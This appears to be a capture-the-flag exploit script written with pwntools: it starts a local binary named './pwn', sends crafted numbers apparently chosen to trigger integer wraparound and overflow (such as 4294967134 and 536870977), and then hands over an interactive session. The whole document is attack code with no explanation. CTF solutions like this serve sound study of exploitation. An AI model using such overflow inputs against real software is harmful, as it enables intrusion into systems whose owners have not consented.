from pwn import *
p = process("./pwn")
payload = b"358"
p.sendline(payload)
p.recvuntil(b"y:")
payload = b"4294967134"
p.sendline(payload)
p.recvuntil(b"Please input x and y:")
payload = "8 " + "536870977"
p.sendline(payload)
p.interactive()

